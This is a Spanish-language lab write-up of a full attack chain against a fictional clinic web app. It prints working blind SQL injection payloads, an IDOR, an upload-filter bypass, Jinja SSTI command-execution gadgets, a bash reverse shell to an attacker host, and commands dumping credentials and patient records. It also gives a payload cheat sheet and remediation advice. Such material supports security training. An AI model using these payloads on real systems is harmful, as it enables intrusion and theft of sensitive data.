# WriteUp — Clínica Aurora Salud

**Laboratorio de Inteligencia de la Seguridad · cadena de explotación completa**

> Entorno de formación controlado y autorizado. Clínica, personas y datos son
> **ficticios**. Todas las acciones descritas se realizan contra la máquina
> objetivo del laboratorio, nunca contra sistemas reales o de terceros.

---

## 0. Resumen ejecutivo

Se parte de la web pública de la clínica (sin credenciales) y se encadenan
cuatro vulnerabilidades hasta obtener ejecución de código en el servidor y
acceso a datos sensibles:

| Fase | Vulnerabilidad | Resultado |
|------|----------------|-----------|
| 1 | OSINT / fuga de información | Nombre de usuario `akournikova` |
| 2 | Blind SQL Injection (booleana) | Contraseña de la Dra. Kournikova |
| 3 | IDOR (Broken Access Control) | Credenciales del `sysadmin` |
| 4 | Subida insegura + SSTI | RCE / reverse shell como `www-data` |
| 5 | Exfiltración | Historias clínicas, backup de clientes y `.env` |

**Mapa MITRE ATT&CK (resumen):** Reconnaissance (TA0043) → Initial Access:
Exploit Public-Facing Application T1190 → Credential Access T1212 → Lateral
Movement / acceso a objetos T1213 → Execution T1059 → Exfiltration TA0010.

A lo largo del documento se usa `TARGET` como la IP/host de la máquina objetivo
(p. ej. `http://10.10.10.50:5000`) y `ATACANTE` como la IP de la máquina del
equipo Red.

---

## Fase 1 — Reconocimiento y OSINT

**Objetivo:** identificar un nombre de usuario válido explorando la web pública.

1. Navegar por el sitio público: `Inicio`, `Sobre nosotros`, `Noticias`,
   `Plantilla`.
2. En **Plantilla** (`/plantilla`) y en **Noticias** (`/noticias`) aparece de
   forma destacada la **Dra. Anna Kournikova** (Cardiología), con su correo
   corporativo:

   ```
   a.kournikova@aurorasalud.example
   ```

3. Del patrón de correo (`inicial + apellido`) y del nombre se deduce el
   **nombre de usuario** probable:

   ```
   akournikova
   ```

**Resultado Fase 1:** usuario `akournikova` (pendiente de contraseña).

---

## Fase 2 — Blind SQL Injection (basada en booleano)

**Objetivo:** extraer la contraseña de `akournikova` desde la base de datos.

**Vector:** el filtro de categorías de la página de **Servicios**:

```
GET /servicios?categoria=Cardiología
```

La respuesta **no muestra los datos de la consulta**: solo cambia un banner
según el resultado. Es una inyección **ciega basada en booleano** (los errores
SQL están silenciados):

- Condición **verdadera** → banner *"Sí ofrecemos servicios en …"*
- Condición **falsa** → banner *"Actualmente no ofrecemos …"*

### 2.1 Confirmar la inyección (oráculo)

El valor se concatena dentro de `... WHERE categoria = '<ENTRADA>'`. Como la
app añade una comilla final, el payload cierra su propia comilla y empareja con
ella (no hace falta `--`).

```
# Verdadero
/servicios?categoria=Cardiología' AND '1'='1
    -> banner "Sí ofrecemos"

# Falso
/servicios?categoria=Cardiología' AND '1'='2
    -> banner "No ofrecemos"
```

URL-encoded (como se ve en Burp):

```
/servicios?categoria=Cardiolog%C3%ADa%27%20AND%20%271%27%3D%271
/servicios?categoria=Cardiolog%C3%ADa%27%20AND%20%271%27%3D%272
```

### 2.2 Averiguar la longitud de la contraseña

```
/servicios?categoria=Cardiología' AND (SELECT LENGTH(password) FROM users WHERE username='akournikova')=13-- 
```

Se prueba por búsqueda binaria hasta que el banner da **verdadero**: longitud
= **13**.

### 2.3 Extracción carácter a carácter

Se usa `SUBSTR()` de SQLite para comparar cada posición. Verdadero confirma el
carácter:

```
/servicios?categoria=Cardiología' AND SUBSTR((SELECT password FROM users WHERE username='akournikova'),1,1)='W'
/servicios?categoria=Cardiología' AND SUBSTR((SELECT password FROM users WHERE username='akournikova'),2,1)='1'
/servicios?categoria=Cardiología' AND SUBSTR((SELECT password FROM users WHERE username='akournikova'),3,1)='m'
...
```

Repitiendo para las 13 posiciones (automatizable) se reconstruye la contraseña.

### 2.4 Automatización

**Burp Suite Intruder:** marca la posición del carácter a probar como payload y
usa como criterio de distinción el texto del banner (*"Sí ofrecemos"*) o la
longitud de la respuesta.

**sqlmap:**

```bash
sqlmap -u "http://TARGET:5000/servicios?categoria=Cardiología" \
       -p categoria --technique=B --string="Sí ofrecemos" \
       -D main -T users -C username,password --dump
```

**Resultado Fase 2:**

```
akournikova : W1mbl3don_97!
```

---

## Fase 3 — Movimiento lateral (IDOR)

**Objetivo:** escalar de la cuenta de la doctora a la del administrador.

### 3.1 Acceso al portal de empleados

Con las credenciales de la Fase 2, iniciar sesión en el portal:

```
POST /portal/login
username=akournikova&password=W1mbl3don_97!
```

Dentro (`/portal`) está el asistente **AuroraBot**.

### 3.2 Identificar el IDOR

En `/portal/chatbot` se listan **solo las conversaciones propias** (p. ej. `#12`
y `#13`). Al abrir una, el identificador aparece en la URL:

```
GET /portal/chatbot/12
```

La aplicación carga la conversación **únicamente por su `id`, sin comprobar que
pertenezca al usuario autenticado** → *Insecure Direct Object Reference*.

### 3.3 Explotación

Manipulando/enumerando el `id` (Burp Intruder sobre el número) se accede a
conversaciones de otros usuarios. La del Administrador de Sistemas es la **67**:

```
GET /portal/chatbot/67
```

En esa conversación el `sysadmin` dejó escritas sus credenciales mientras
"depuraba" un problema de acceso, y menciona la ruta `/admin`.

**Resultado Fase 3:**

```
sysadmin : S3rv3r_Aur0ra#2024!
```

---

## Fase 4 — Ejecución de código (subida insegura → SSTI → RCE)

**Objetivo:** ejecutar comandos en el servidor y obtener una shell.

### 4.1 Acceso al panel de administración

Cerrar sesión y entrar de nuevo como administrador:

```
POST /portal/login
username=sysadmin&password=S3rv3r_Aur0ra#2024!
```

Ahora es accesible **Administración** (`/admin`), con un gestor de **plantillas
de informe** (un empleado normal recibiría 403).

### 4.2 Saltar el filtro de extensión (doble extensión)

El panel dice admitir **solo `.txt`**, pero valida mal: comprueba si el nombre
*contiene* `.txt` en lugar de verificar la extensión **real** (la última).

- `shell.php` → **rechazado** (*"Formato no permitido"*).
- `informe.txt` → aceptado.
- `shell.txt.php` → **aceptado** (bypass por doble extensión).

### 4.3 Confirmar SSTI

La vista previa (`/admin/preview/<archivo>`) **renderiza el archivo con Jinja**.
Subir un archivo llamado `prueba.txt.php` con el contenido:

```
Prueba: {{ 7*7 }}
```

La vista previa muestra `Prueba: 49` → **Server-Side Template Injection**
confirmada.

> En este stack Flask la ejecución ocurre al **previsualizar** (SSTI). En un
> despliegue PHP+Apache, el `.txt.php` lo ejecutaría el handler de PHP al
> solicitarlo: misma causa raíz (filtro de extensión débil).

### 4.4 Ejecución de comandos (webshell)

Subir `shell.txt.php` con un *gadget* de Jinja que llega a `os`:

```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

La vista previa devuelve la salida de `id` (usuario `www-data` en el
contenedor). Gadget alternativo:

```jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### 4.5 Reverse shell

En la máquina atacante, poner a la escucha:

```bash
nc -lvnp 4444
```

Subir `rev.txt.php` con:

```jinja
{{ cycler.__init__.__globals__.os.popen('setsid bash -c "bash -i >& /dev/tcp/ATACANTE/4444 0>&1" &').read() }}
```

Al previsualizar el archivo, el servidor conecta de vuelta y se obtiene una
shell interactiva como `www-data`.

**Resultado Fase 4:** ejecución de comandos / shell como `www-data`.

---

## Fase 5 — Escalada de información y exfiltración (el botín)

**Objetivo:** localizar y robar los datos sensibles desde la shell.

Ya sea por reverse shell o ejecutando comandos vía SSTI
(`{{ ... os.popen('COMANDO').read() }}`), desde el servidor se recopila:

### 5.1 Credenciales internas en el fichero de configuración

```bash
cat .env
```

Expone, entre otros:

```
DB_USER=aurora_dbadmin
DB_PASSWORD=Pr0d_DB_Aur0ra!2024
SMTP_USER=noreply@aurorasalud.example
SMTP_PASSWORD=Smtp_Aur0ra_2024
BACKUP_PATH=/var/backups/clinica/backup_clientes_2024.csv
```

### 5.2 Copia de seguridad de clientes

```bash
cat backup_clientes_2024.csv
cat /var/backups/clinica/backup_clientes_2024.csv
```

Datos personales de clientes (nombre, email, teléfono, DNI, nº de tarjeta
sanitaria, póliza).

### 5.3 Historias clínicas (base de datos)

La tabla objetivo `pacientes_historias_clinicas` está en la BD SQLite:

```bash
# localizar la base de datos
ls -la clinica.db
# volcar la tabla de historias clínicas
sqlite3 clinica.db "SELECT * FROM pacientes_historias_clinicas;"
```

Si `sqlite3` no estuviera disponible, se puede volcar con Python:

```bash
python3 -c "import sqlite3;print(sqlite3.connect('clinica.db').execute('select * from pacientes_historias_clinicas').fetchall())"
```

Contiene datos de salud (categoría especial del RGPD): diagnósticos,
medicación y alergias por paciente.

**Resultado Fase 5:** exfiltración de credenciales internas, backup de clientes
e historias clínicas → compromiso total de la confidencialidad.

---

## Apéndice A — Credenciales y datos obtenidos

| Elemento | Valor |
|----------|-------|
| Usuario doctora (F1/F2) | `akournikova` / `W1mbl3don_97!` |
| Usuario administrador (F3) | `sysadmin` / `S3rv3r_Aur0ra#2024!` |
| Shell (F4) | `www-data` en el contenedor |
| BD interna (F5) | `aurora_dbadmin` / `Pr0d_DB_Aur0ra!2024` |
| Botín (F5) | `pacientes_historias_clinicas`, `backup_clientes_2024.csv`, `.env` |

## Apéndice B — Cronología de payloads (chuleta)

```
F2  /servicios?categoria=Cardiología' AND '1'='1
F2  /servicios?categoria=Cardiología' AND (SELECT LENGTH(password) FROM users WHERE username='akournikova')=13-- 
F2  /servicios?categoria=Cardiología' AND SUBSTR((SELECT password FROM users WHERE username='akournikova'),N,1)='X'
F3  GET /portal/chatbot/67
F4  subir shell.txt.php  ->  {{ cycler.__init__.__globals__.os.popen('id').read() }}
F4  revshell            ->  {{ cycler.__init__.__globals__.os.popen('setsid bash -c "bash -i >& /dev/tcp/ATACANTE/4444 0>&1" &').read() }}
F5  cat .env ; cat backup_clientes_2024.csv ; sqlite3 clinica.db "SELECT * FROM pacientes_historias_clinicas;"
```

## Apéndice C — Remediación (resumen defensivo)

- **F2 SQLi:** consultas parametrizadas; allow-list de categorías; mínimo
  privilegio en la cuenta de BD; contraseñas hasheadas (bcrypt/argon2).
- **F3 IDOR:** autorización a nivel de objeto (`WHERE id=? AND usuario=?`);
  identificadores no predecibles; no exponer secretos en el chat.
- **F4 Subida/SSTI:** validar la ÚLTIMA extensión con allow-list y renombrar;
  no renderizar contenido subido como plantilla (escape / entorno aislado);
  ejecutar sin privilegios y contenerizado; `debug=False` + WSGI de producción;
  restringir egress para dificultar reverse shells.
- **F5 Exfiltración:** no almacenar secretos en `.env` accesibles por la app;
  cifrado en reposo; segmentación y monitorización (Suricata/Wazuh).

Referencias OWASP: A01 (Broken Access Control), A03 (Injection/SSTI),
Unrestricted File Upload.
